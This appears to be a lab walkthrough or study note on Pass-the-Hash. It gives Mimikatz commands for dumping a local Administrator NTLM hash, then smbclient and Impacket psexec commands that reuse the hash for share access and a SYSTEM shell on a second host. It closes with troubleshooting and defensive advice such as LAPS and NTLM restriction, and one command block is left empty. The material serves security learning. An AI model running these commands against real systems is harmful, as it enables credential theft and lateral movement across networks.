## Overview

**Passing NTLM** is the process of using an **NTLM hash** directly for authentication instead of cracking it to recover the plaintext password.

This technique is commonly known as **Pass the Hash**, or **PtH**.

The key idea is simple:

```text
If the hash is valid, and the protocol accepts NTLM authentication, the plaintext password may not be needed.
```

This is useful when:

- cracking the hash is too slow
- the password is too complex
- the hash belongs to a privileged account
- the same local admin password is reused across multiple hosts

---

## Why Passing NTLM Works

NTLM and LM password hashes are not salted.

This means that the same password produces the same hash every time.

If two machines have a local account with the same username and password, the NTLM hash will also be the same.

Example:

```text
FILES01\Administrator password == FILES02\Administrator password
```

If the `Administrator` password is reused across both systems, a hash dumped from `FILES01` may be usable against `FILES02`.

---

## Passing NTLM vs Cracking NTLM

| Technique | Requires Plaintext Password? | Uses Hash Directly? | Purpose |
|---|---:|---:|---|
| Cracking NTLM | Eventually, yes | No | Recover the plaintext password |
| Passing NTLM | No | Yes | Authenticate using the hash |

Passing NTLM is often faster than cracking because the attacker does not need to recover the original password.

---

## Important Limitation

Passing NTLM only proves that authentication is possible.

To turn authentication into remote code execution, the account usually needs administrative privileges on the target.

| Scenario | Likely Result |
|---|---|
| Valid hash, normal user | May access permitted resources |
| Valid hash, local admin | May allow remote command execution |
| Invalid hash | Authentication fails |
| Valid hash, no rights to target service | Access denied |

## Lab Scenario

In this example, access has already been gained to:

```text
FILES01
192.168.50.211
```

Known credentials:

```text
Username: gunther
Password: password123!
```

The goal is to:

1. Extract the local `Administrator` NTLM hash from `FILES01`
2. Use that hash to authenticate to `FILES02`
3. Access a restricted SMB share
4. Obtain an interactive shell on `FILES02`

Target system:

```text
FILES02
192.168.50.212
```

Restricted SMB share:

```text
\\192.168.50.212\secrets
```

---

## Attack Assumption

This walkthrough assumes that the local `Administrator` accounts on both machines use the same password.

```text
FILES01\Administrator password == FILES02\Administrator password
```

This is common in poorly managed Windows environments.

If local administrator passwords are reused, dumping the hash from one host may allow access to other hosts.

## Initial SMB Access Test

From `FILES01`, the user `gunther` tries to access:

```text
\\192.168.50.212\secrets
```

The access attempt fails.

This suggests that:

- the `gunther` account does not exist on `FILES02`
- or `gunther` does not have permission to access the share

So another credential is needed.

# Extracting the Administrator NTLM Hash

## Step 1: Start Mimikatz

On `FILES01`, open PowerShell as Administrator.

Change into the tools directory:

```powershell
cd C:\tools
```

Start Mimikatz:

```powershell
.\mimikatz.exe
```

---

## Step 2: Enable Debug Privileges

Inside Mimikatz, run:

```text
privilege::debug
```

Expected output:

```text
Privilege '20' OK
```

This enables `SeDebugPrivilege`, which is required for many credential-dumping actions.

---

## Step 3: Elevate to SYSTEM

Run:

```text
token::elevate
```

This attempts to impersonate the `NT AUTHORITY\SYSTEM` account.

---

## Step 4: Dump SAM Hashes

Run:

```text
lsadump::sam
```

Example output:

```text
RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 7a38310ea6f0027ee955abed1762964b
```

The extracted NTLM hash is:

```text
7a38310ea6f0027ee955abed1762964b
```

# Passing the Hash to SMB

## Using smbclient

`smbclient` can authenticate to an SMB share using an NTLM hash instead of a plaintext password.

Syntax:

```bash
smbclient //<target>/<share> -U <user> --pw-nt-hash <NTLM_HASH>
```

Example:

```bash
smbclient //192.168.50.212/secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
```

Escaped backslash format:

```bash
smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
```

---

## Listing Files

Once connected to the SMB share, list files with:

dir

# Passing the Hash for Remote Shells

Passing NTLM is not limited to file share access.

If the account has administrative privileges, the hash can often be used for remote command execution.

Common tools include:

- `impacket-psexec`
- `impacket-wmiexec`
- `impacket-smbexec`
- `impacket-atexec`

---

# Impacket PsExec

## What PsExec Does

`impacket-psexec` works similarly to Sysinternals PsExec.

It typically:

1. authenticates to the target
2. searches for a writable administrative share
3. uploads an executable
4. creates a Windows service
5. starts the service
6. provides an interactive shell

The resulting shell is usually:

```text
NT AUTHORITY\SYSTEM
```

---

## Impacket Hash Format

Impacket expects hashes in this format:

```text
LMHASH:NTHASH
```

If only the NTLM hash is known, use 32 zeroes for the LM hash:

```text
00000000000000000000000000000000:<NTLM_HASH>
```

Example:

```text
00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b
```

---

## PsExec Command

```bash
impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
```

---

# Impacket WMIExec

## What WMIExec Does

`impacket-wmiexec` uses Windows Management Instrumentation for command execution.

Unlike `psexec`, it usually provides a shell in the context of the authenticated user.

So if you authenticate as:

```text
Administrator
```

the shell normally runs as:

```text
FILES02\Administrator
```

---

## WMIExec Command

```bash

```

## PsExec vs WMIExec

| Tool | Execution Method | Typical Shell Context |
|---|---|---|
| `impacket-psexec` | Service creation | `NT AUTHORITY\SYSTEM` |
| `impacket-wmiexec` | WMI | Authenticated user |
| `impacket-smbexec` | SMB/service-based execution | Often SYSTEM-like behaviour |
| `impacket-atexec` | Scheduled task | Depends on execution context |

# UAC Remote Restrictions

Since Windows Vista, Windows has **UAC remote restrictions** enabled by default.

These restrictions limit what local administrator accounts can do remotely.

This affects Pass-the-Hash because a hash may authenticate successfully but still fail to execute commands remotely.

---

## Local Administrator Exception

The built-in local Administrator account, usually RID 500, is treated differently.

Example RID:

```text
RID  : 000001f4 (500)
User : Administrator
```

In many cases, the built-in `Administrator` account is less restricted than other local administrator users.

This is why PtH examples often use:

```text
Administrator
```

rather than another local admin account.

---

## Practical Meaning

A hash may work for SMB authentication but fail for remote code execution.

For example:

| Test | Result |
|---|---|
| Access SMB share | Works |
| Run remote command | Fails |
| PsExec shell | Fails |
| WMIExec shell | Fails |

This may be caused by:

- UAC remote restrictions
- insufficient privileges
- firewall rules
- disabled admin shares
- service creation blocked
- WMI blocked
- account not actually admin on the target

# Troubleshooting

## SMB Authentication Works but PsExec Fails

Possible causes:

- user is not local admin
- admin shares are disabled
- firewall blocks SMB or service control
- UAC remote restrictions
- service creation is blocked
- antivirus or EDR blocks payload upload
- target does not allow remote service creation

---

## WMIExec Fails

Possible causes:

- WMI service is disabled
- firewall blocks WMI/RPC
- user lacks required rights
- UAC remote restrictions apply
- DCOM restrictions apply
- endpoint security blocks execution

---

## Hash Does Not Work

Possible causes:

- wrong username
- wrong domain or local context
- password differs between systems
- account is disabled
- account is locked
- target does not allow NTLM
- hash was copied incorrectly

# Local vs Domain Context

When passing NTLM, be clear whether the account is:

- a local account
- a domain account

For a local account, the username context is usually:

```text
.\Administrator
```

or:

```text
FILES02\Administrator
```

For a domain account:

```text
DOMAIN\username
```

or:

```text
username@domain.local
```

---

## Local Account Example

```bash
impacket-psexec -hashes 00000000000000000000000000000000:<NTLM_HASH> Administrator@192.168.50.212
```

---

## Domain Account Example

```bash
impacket-psexec -hashes 00000000000000000000000000000000:<NTLM_HASH> INLANEFREIGHT/julio@192.168.50.212
```

# Security Impact

Passing NTLM is dangerous because it allows lateral movement without needing plaintext passwords.

If one local admin password is reused across multiple systems, one dumped hash can potentially compromise many machines.

Example:

```text
Dump Administrator hash from FILES01
Use same hash against FILES02
Use same hash against FILES03
Use same hash against FILES04
```

This is why local administrator password reuse is a major finding during internal penetration tests.

---

# Defensive Recommendations

## Use LAPS or Windows LAPS

The most important mitigation is to prevent local admin password reuse.

```text
LAPS = Local Administrator Password Solution
```

LAPS randomises and rotates local administrator passwords per machine.

This means that compromising one local Administrator hash should not automatically compromise every other host.

---

## Reduce NTLM Usage

Where possible:

- disable NTLM
- restrict NTLM
- prefer Kerberos
- monitor NTLM authentication
- block NTLM where legacy compatibility is not required

---

## Protect Credential Material

Defensive controls include:

- enable Credential Guard
- protect LSASS
- restrict local administrator access
- avoid shared local admin passwords
- disable unnecessary admin shares
- limit remote administration rights
- monitor SAM and LSASS access
- alert on Mimikatz-like behaviour
- use EDR controls for credential dumping
- enforce strong, unique passwords

---

## Monitor for PtH Behaviour

Look for:

- lateral SMB authentication
- failed logons across many hosts
- local Administrator logons from unusual systems
- service creation events
- remote scheduled task creation
- WMI process creation
- suspicious use of admin shares
- LSASS access events

---

# Key Takeaways

- Passing NTLM allows authentication using an NTLM hash instead of a plaintext password.
- Cracking the password is not always necessary.
- The hash must match a valid username on the target.
- Remote code execution usually requires administrative rights.
- Shared local Administrator passwords make PtH much more dangerous.
- `smbclient` can use NTLM hashes for SMB share access.
- `impacket-psexec` can provide a SYSTEM shell.
- `impacket-wmiexec` can provide a shell as the authenticated user.
- UAC remote restrictions can prevent remote command execution.
- LAPS is one of the strongest mitigations against local admin hash reuse.
